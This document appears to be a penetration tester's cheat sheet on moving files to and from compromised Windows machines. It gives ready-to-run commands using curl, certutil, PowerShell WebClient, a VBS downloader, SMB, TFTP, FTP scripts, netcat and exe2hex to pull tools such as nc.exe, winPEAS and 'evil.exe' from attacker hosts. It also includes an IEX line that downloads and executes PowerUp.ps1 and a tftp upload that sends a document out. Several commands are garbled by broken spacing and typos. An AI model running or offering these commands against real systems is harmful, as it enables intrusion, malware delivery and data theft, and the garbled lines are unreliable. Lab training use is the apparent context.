---
title: Windows_File_Transfer
permalink: /Windows/File_Transfer
---


## First, test ##
```curl http://10.10.16.7:1234/nc.exe -o nc.exe```` 

```powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')```

```certutil.exe -urlcache -split -f http://10.10.16.4/winPEASany_ofs.exe```

```python3 /usr/share/doc/python3-impacket/examples/smbserver.py share ./```
```cp \\10.10.16.6\Share\winPEASany_ofs.exe```

With last method, password can be requested. Then ,go

```net use x: \\10.10.14.3\sifo /user:sifo sifopassword```
```sudo /opt/impacket/examples/smbserver.py sifo . -smb2support -username sifo -password sifopassword```

## Execute a file directly ##
```echo IEX(Nex-Object Net.WebClient).DownloadString("http://10.10.16.6:8000/PowerUp.ps1") | powershell -noprofile -```

# #For older versions like Windows XP and Windows Server 2003, use tftp
```kali@kali:~$ sudo apt update && sudo apt install atftp kali@kali:~$ sudo mkdir /tftp```  
```kali@kali:~$ sudo chown nobody: /tftp```  
```kali@kali:~$ sudo atftpd --daemon --port 69 /tftp```

```C:\Users\Offsec> tftp -i $kali_ip put important.docx```

## File transfer
```C:\Users\offsec> nc -nlvp 4444 > incoming.exe```
```nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe```


## Trickier ways ##

https://github.com/LOLBAS-Project/LOLBAS

#base64 powershell
https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58

#Non-Interactive FTP Download
kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/
kali@kali:~$ sudo systemctl restart pure-ftpd

C:\Users\offsec>echo open 10.11.0.4 21> ftp.txt
C:\Users\offsec>echo USER offsec>> ftp.txt
C:\Users\offsec>echo lab>> ftp.txt
C:\Users\offsec>echo bin >> ftp.txt
C:\Users\offsec>echo GET nc.exe >> ftp.txt
C:\Users\offsec>echo bye >> ftp.txt
C:\Users\offsec> ftp -v -n -s:ftp.txt
ftp> open 192.168.1.31 21
ftp> USER offsec
ftp> bin
ftp> GET nc.exe ftp> bye
C:\Users\offsec> nc.exe -h

#Windows Downloads Using Scripting Languages

echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wge t.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget. vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs echo Next >> wget.vbs
echo ts.Close >> wget.vbs

C:\Users\Offsec> cscript wget.vbs http://10.11.0.4/evil.exe evil.exe

#Same with powershell
C:\Users\Offsec> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
C:\Users\Offsec> echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1
C:\Users\Offsec> echo $webclient.DownloadFile($url,$file) >>wget.ps1

C:\Users\Offsec> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoPro file -File wget.ps1

#same as oneliner
C:\Users\Offsec> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')

#Windows Downloads with exe2hex and PowerShell
kali@kali:~$ upx -9 nc.exe #reduce the size of an exe
kali@kali:~$ exe2hex -x nc.exe -p nc.cmd #convert it to windows script
#then copy and paste script onto windows machine

C:\Users\offsec>powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$ h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte ]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1}; set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force nc.hex;

